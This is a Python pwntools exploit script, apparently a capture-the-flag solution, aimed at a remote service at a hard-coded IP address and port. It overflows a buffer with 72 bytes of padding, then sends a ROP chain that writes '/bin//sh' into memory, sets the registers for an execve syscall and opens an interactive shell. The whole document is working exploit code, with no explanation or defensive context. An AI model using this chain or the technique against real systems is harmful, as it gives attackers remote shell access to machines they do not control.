from struct import pack
from pwn import *

io =  remote("65.1.92.179", 49153)
# Padding goes here
p = b'A'*72

p += p64(0x000000000040f4be) # pop rsi ; ret
p += p64(0x00000000004c00e0) # @ .data
p += p64(0x00000000004175eb) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040f4be) # pop rsi ; ret
p += p64(0x00000000004c00e8) # @ .data + 8
p += p64(0x0000000000446959) # xor rax, rax ; ret
p += p64(0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040191a) # pop rdi ; ret
p += p64(0x00000000004c00e0) # @ .data
p += p64(0x000000000040f4be) # pop rsi ; ret
p += p64(0x00000000004c00e8) # @ .data + 8
p += p64(0x000000000040181f) # pop rdx ; ret
p += p64(0x00000000004c00e8) # @ .data + 8
p += p64(0x0000000000446959) # xor rax, rax ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004774d0) # add rax, 1 ; ret
p += p64(0x00000000004012d3) # syscall


io.sendlineafter(":", p)
io.interactive()